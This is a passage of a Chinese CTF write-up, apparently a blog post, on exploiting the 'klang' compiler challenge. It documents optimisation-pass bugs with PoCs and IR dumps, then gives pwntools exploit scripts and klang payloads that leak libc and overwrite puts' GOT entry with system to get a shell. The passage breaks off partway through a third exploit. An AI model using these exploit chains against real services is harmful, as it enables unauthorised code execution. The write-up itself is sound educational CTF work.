class="hljs-number">1</span>;<br>	&#125;<br>	<span class="hljs-keyword">while</span>(d &gt; <span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>优化前后的IR：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">BEFORE:<br>define test<br>bb1:<br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">1</span><br>        jmp bb3<br><br>bb2:<br>        ret %<span class="hljs-number">1</span><br><br>bb3:<br>        %<span class="hljs-number">2</span> = $<span class="hljs-number">0</span> + $<span class="hljs-number">1</span><br>        %<span class="hljs-number">0</span> = %<span class="hljs-number">2</span><br>        %<span class="hljs-number">4</span> = load_label __str0<br>        call prints %<span class="hljs-number">4</span><br>        call printi %<span class="hljs-number">0</span><br>        %<span class="hljs-number">6</span> = %<span class="hljs-number">1</span> - #<span class="hljs-number">1</span><br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">6</span><br>        %<span class="hljs-number">7</span> = %<span class="hljs-number">1</span> &gt; #<span class="hljs-number">0</span><br>        jnz %<span class="hljs-number">7</span>, bb3, bb2<br>            <br>AFTER:<br>define test<br>bb1:<br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">1</span><br>        jmp bb3<br><br>bb2:<br>        ret %<span class="hljs-number">1</span><br><br>bb3:<br>        %<span class="hljs-number">4</span> = load_label __str0<br>        call prints %<span class="hljs-number">4</span><br>        call printi %<span class="hljs-number">8</span><br>        %<span class="hljs-number">6</span> = %<span class="hljs-number">1</span> - #<span class="hljs-number">1</span><br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">6</span><br>        %<span class="hljs-number">7</span> = %<span class="hljs-number">6</span> &gt; #<span class="hljs-number">0</span><br>        jnz %<span class="hljs-number">7</span>, bb3, bb2<br></code></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./gcse1</span>            <br>OUTPUT c = 114514 + 233333:<br>0<br></code></pre></td></tr></table></figure>
+
+<p>会有这个输出还有下面👇的问题的原因</p>
+</li>
+<li><p>GlobalCSEBlock替换的时候会先递归替换BB所有前驱中的expr再换BB</p>
+<ul>
+<li>但替换后没有State中删除expr</li>
+<li>如果BB没有前驱会造成未初始化访问</li>
+</ul>
+<p>POC</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span>:-&gt;<span class="hljs-type">int</span><br>&#123;<br>	test(<span class="hljs-number">114514</span>, <span class="hljs-number">233333</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> : <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d -&gt; <span class="hljs-type">int</span><br>&#123;<br>	c := a + <span class="hljs-number">1</span>;<br>	printi(c);<br>	<span class="hljs-keyword">if</span> (b &gt; <span class="hljs-number">100</span>)<br>	&#123;<br>		d := a + <span class="hljs-number">1</span>;<br>	&#125;;<br>	<span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>优化前后的IR</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">BEFORE:<br>define test<br>bb1:<br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">2</span> = $<span class="hljs-number">0</span> + #<span class="hljs-number">1</span><br>        %<span class="hljs-number">0</span> = %<span class="hljs-number">2</span><br>        call printi %<span class="hljs-number">0</span><br>        %<span class="hljs-number">4</span> = $<span class="hljs-number">1</span> &gt; #<span class="hljs-number">64</span><br>        jnz %<span class="hljs-number">4</span>, bb3, bb2<br><br>bb2:<br>        ret %<span class="hljs-number">1</span><br><br>bb3:<br>        %<span class="hljs-number">5</span> = $<span class="hljs-number">0</span> + #<span class="hljs-number">1</span><br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">5</span><br>        jmp bb2<br>            <br>AFTER:<br>define test<br>bb1:<br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        call printi %<span class="hljs-number">6</span><br>        %<span class="hljs-number">6</span> = $<span class="hljs-number">1</span> &gt; #<span class="hljs-number">64</span><br>        jnz %<span class="hljs-number">6</span>, bb3, bb2<br><br>bb2:<br>        ret %<span class="hljs-number">1</span><br><br>bb3:<br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">6</span><br>        jmp bb2<br></code></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./gcse</span>            <br>140063322342087<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="DeadCodeElimination"><a href="#DeadCodeElimination" class="headerlink" title="DeadCodeElimination"></a>DeadCodeElimination</h3><h4 id="DeadVariableElimination"><a href="#DeadVariableElimination" class="headerlink" title="DeadVariableElimination"></a>DeadVariableElimination</h4><p>数据结构：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LivenessState</span> &#123;</span><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">set</span>&lt;<span class="hljs-type">size_t</span>&gt; LiveRegs_;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<h5 id="BUG-4"><a href="#BUG-4" class="headerlink" title="BUG"></a>BUG</h5><p>在Call、CallVoid和ArrayStore相关变量判断的时候取的是Reg的最后一次定义，有可能在该指令之后，这样会导致之前的定义被优化掉</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> InstIt = BB-&gt;begin(); InstIt != BB-&gt;end(); InstIt++) &#123;<br>  <span class="hljs-keyword">auto</span> &amp;Inst = *InstIt;<br>  <span class="hljs-keyword">if</span>(Inst.Type() == Instruction::Call <br>  || Inst.Type() == Instruction::CallVoid <br>  || Inst.Type() == Instruction::ArrayStore) &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; Inst.Ins(); i++) &#123;<br>      <span class="hljs-keyword">auto</span> Op = Inst.GetIn(i);<br>      <span class="hljs-keyword">if</span>(Op.IsRegister()) &#123;<br>        AddAllToNeeded(LastDefs[Op.RegId()]);	<span class="hljs-comment">// 取到的LastDef可能在Call之后</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>POC：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> c -&gt; <span class="hljs-type">int</span> <br>&#123;<br>	<span class="hljs-type">double</span>(c);<br>	c := b + <span class="hljs-number">1</span>;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">double</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> : -&gt; <span class="hljs-type">int</span><br>&#123;<br>	<span class="hljs-keyword">return</span> a * a;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>优化前后的IR：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">BEFORE<br>define main<br>bb1:<br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">2</span> = #<span class="hljs-number">0</span><br>        call <span class="hljs-type">double</span> %<span class="hljs-number">2</span><br>        %<span class="hljs-number">4</span> = #<span class="hljs-number">0</span> + #<span class="hljs-number">1</span><br>        %<span class="hljs-number">2</span> = %<span class="hljs-number">4</span><br>        ret #<span class="hljs-number">0</span><br><br>AFTER<br>define main<br>bb1:<br>        call <span class="hljs-type">double</span> %<span class="hljs-number">2</span><br>        %<span class="hljs-number">4</span> = #<span class="hljs-number">1</span><br>        %<span class="hljs-number">2</span> = %<span class="hljs-number">4</span><br>        ret #<span class="hljs-number">0</span><br>            <br>FINAL<br>define main<br>bb1:<br>        call <span class="hljs-type">double</span> #<span class="hljs-number">1</span>	<span class="hljs-comment">// %2 = #1是常量传播的锅</span><br>        ret #<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="CodeGen"><a href="#CodeGen" class="headerlink" title="CodeGen"></a>CodeGen</h2><ul>
+<li><p>Codegen</p>
+<ul>
+<li><p>数据结构：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/mf.png" srcset="/img/loading.gif" lazyload class title="mf">
+</li>
+<li><p>功能：IR转指令，替换虚拟寄存器</p>
+</li>
+</ul>
+</li>
+<li><p>InstSched</p>
+<ul>
+<li><p>数据结构：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/node.png" srcset="/img/loading.gif" lazyload class title="node">
+</li>
+<li><p>功能：指令调度，顺序优化</p>
+</li>
+</ul>
+</li>
+<li><p>RegAlloc：</p>
+<ul>
+<li><p>数据结构：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/live.png" srcset="/img/loading.gif" lazyload class title="live">
+</li>
+<li><p>功能：寄存器分配</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="RegAlloc"><a href="#RegAlloc" class="headerlink" title="RegAlloc"></a>RegAlloc</h3><p>Linear Scan算法：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/scan.png" srcset="/img/loading.gif" lazyload class title="scan">
+
+<h4 id="BUG-5"><a href="#BUG-5" class="headerlink" title="BUG"></a>BUG</h4><p>发生Spill的时候只从当前Interval的Start开始，也就是只从发生Spill的时间点开始标记</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(Active.size() == kAllocatableRegisters) &#123;<br>  <span class="hljs-keyword">auto</span> [Spilled, _] = SpillAtInterval(I);<br>  <span class="hljs-keyword">auto</span> Slot = AllocateSpillSlot(Spilled);<br>  Spilled-&gt;SpillAt(I-&gt;Start(), Slot);<br>&#125; <br></code></pre></td></tr></table></figure>
+
+<p>如果有BackEdge的话会有问题，会使用Spill前的寄存器而不是Stack空间</p>
+<p>POC：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-built_in">array</span> a, <span class="hljs-built_in">array</span> b, <span class="hljs-built_in">array</span> c, <span class="hljs-built_in">array</span> d, <span class="hljs-built_in">array</span> e, <span class="hljs-built_in">array</span> f, <span class="hljs-type">int</span> g -&gt; <span class="hljs-type">int</span><br>&#123;<br>	a := array_new(<span class="hljs-number">1</span>);<br>	b := array_new(<span class="hljs-number">2</span>);<br>	c := array_new(<span class="hljs-number">3</span>);<br>	d := array_new(<span class="hljs-number">4</span>);<br>	e := array_new(<span class="hljs-number">5</span>);<br>	f := array_new(<span class="hljs-number">7</span>);<br>	<span class="hljs-keyword">do</span><br>	&#123;<br>		f[<span class="hljs-number">0</span>] := <span class="hljs-number">10</span>;<br>		g := inputi();<br>		a[<span class="hljs-number">0</span>] := <span class="hljs-number">1</span>;<br>		b[<span class="hljs-number">0</span>] := <span class="hljs-number">2</span>;<br>		c[<span class="hljs-number">0</span>] := <span class="hljs-number">3</span>;<br>		d[<span class="hljs-number">0</span>] := <span class="hljs-number">4</span>;<br>		e[<span class="hljs-number">0</span>] := <span class="hljs-number">5</span>;<br>		f[<span class="hljs-number">0</span>] := <span class="hljs-number">6</span>;<br>	&#125;<br>	<span class="hljs-keyword">while</span>(inputi());<br>	dup(g);<br>	dup(f[<span class="hljs-number">0</span>]);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">dup</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> : -&gt; <span class="hljs-type">int</span><br>&#123;<br>	<span class="hljs-keyword">return</span> a * a;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>输入输出：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./test</span><br>114514<br>1<br>zsh: segmentation fault  ./test<br></code></pre></td></tr></table></figure>
+
+<h1 id="终于能开始pwn了-ˉ▽ˉ；-…"><a href="#终于能开始pwn了-ˉ▽ˉ；-…" class="headerlink" title="终于能开始pwn了(ˉ▽ˉ；)…"></a>终于能开始pwn了(ˉ▽ˉ；)…</h1><h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h2><p>GlobalCSE未初始化泄漏libc + RegAlloc任意写改puts的got表</p>
+<ul>
+<li><p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#p=process(&#x27;./test&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp.klang&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    content=file.read()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Give me your code, ended by a line with \&#x27;END_OF_SNIPPET\&#x27; (excluding quote).&#x27;</span>,content.encode())<br>p.sendline(<span class="hljs-string">b&#x27;END_OF_SNIPPET&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>p.recvline()<br>libcbase=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>].decode())-<span class="hljs-number">0xe2d9b</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x4006a0</span>).encode())<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]).encode())<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>exp.klang</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> libcbase -&gt; <span class="hljs-type">int</span><br>&#123;<br>	leak_libc(<span class="hljs-number">123123</span>, <span class="hljs-number">23333</span>);<br>	hack();<br>	prints(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">leak_libc</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> :  <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d-&gt; <span class="hljs-type">int</span><br>&#123;<br>	c := a + <span class="hljs-number">1</span>;<br>	printi(c);<br>	<span class="hljs-keyword">if</span> (b &gt; <span class="hljs-number">100</span>)<br>	&#123;<br>		d := a + <span class="hljs-number">1</span>;<br>	&#125;;<br>	<span class="hljs-keyword">return</span> d;	<br>&#125;<br><br>function <span class="hljs-title function_">hack</span><span class="hljs-params">()</span> : <span class="hljs-built_in">array</span> a, <span class="hljs-built_in">array</span> b, <span class="hljs-built_in">array</span> c, <span class="hljs-built_in">array</span> d, <span class="hljs-built_in">array</span> e, <span class="hljs-built_in">array</span> f, <span class="hljs-type">int</span> g -&gt; <span class="hljs-type">int</span><br>&#123;<br>	a := array_new(<span class="hljs-number">1</span>);<br>	b := array_new(<span class="hljs-number">2</span>);<br>	c := array_new(<span class="hljs-number">3</span>);<br>	d := array_new(<span class="hljs-number">4</span>);<br>	e := array_new(<span class="hljs-number">5</span>);<br>	f := array_new(<span class="hljs-number">7</span>);<br>	<span class="hljs-keyword">do</span><br>	&#123;<br>		f[<span class="hljs-number">0</span>] := inputi();<br>		g := inputi();<br>		a[<span class="hljs-number">0</span>] := <span class="hljs-number">1</span>;<br>		b[<span class="hljs-number">0</span>] := <span class="hljs-number">2</span>;<br>		c[<span class="hljs-number">0</span>] := <span class="hljs-number">3</span>;<br>		d[<span class="hljs-number">0</span>] := <span class="hljs-number">4</span>;<br>		e[<span class="hljs-number">0</span>] := <span class="hljs-number">5</span>;<br>	&#125;<br>	<span class="hljs-keyword">while</span>(inputi());<br>	dup(g);<br>	dup(f[<span class="hljs-number">0</span>]);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">dup</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> : -&gt; <span class="hljs-type">int</span><br>&#123;<br>	<span class="hljs-keyword">return</span> a * a;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h2><p>GlobalCSE未初始化泄漏libc + DCE任意写</p>
+<ul>
+<li><p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#p=process(&#x27;./test&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp.klang&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    content=file.read()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Give me your code, ended by a line with \&#x27;END_OF_SNIPPET\&#x27; (excluding quote).&#x27;</span>,content.encode())<br>p.sendline(<span class="hljs-string">b&#x27;END_OF_SNIPPET&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>p.recvline()<br>libcbase=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>].decode())-<span class="hljs-number">0xe2d9b</span><br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x4006a0</span>).encode())<br>p.sendline(<span class="hljs-built_in">str</span>(libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]).encode())<br>p.interactive()<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>exp.klang</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a -&gt; <span class="hljs-type">int</span><br>&#123;<br>	leak_libc(<span class="hljs-number">123</span>, <span class="hljs-number">456</span>);<br>	write();<br>	prints(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">write</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a -&gt; <span class="hljs-type">void</span><br>&#123;<br>	a := inputi();<br>	write_();<br>	<span class="hljs-keyword">return</span>;<br>&#125;<br><br>function <span class="hljs-title function_">write_</span><span class="hljs-params">()</span> : <span class="hljs-built_in">array</span> c -&gt; <span class="hljs-type">void</span><br>&#123;<br>	c[<span class="hljs-number">0</span>] := inputi();<br>	c := array_new(<span class="hljs-number">1</span>);<br>	<span class="hljs-keyword">return</span>;<br>&#125;<br><br>function <span class="hljs-title function_">leak_libc</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> :  <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d-&gt; <span class="hljs-type">int</span><br>&#123;<br>	c := a + <span class="hljs-number">1</span>;<br>	printi(c);<br>	<span class="hljs-keyword">if</span> (b &gt; <span class="hljs-number">100</span>)<br>	&#123;<br>		d := a + <span class="hljs-number">1</span>;<br>	&#125;;<br>	<span class="hljs-keyword">return</span> d;	<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h2><p>GlobalCSE未初始化泄漏libc + WHILE中ret</p>
+<ul>
+<li><p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#p=process(&#x27;./test&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp.klang&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span 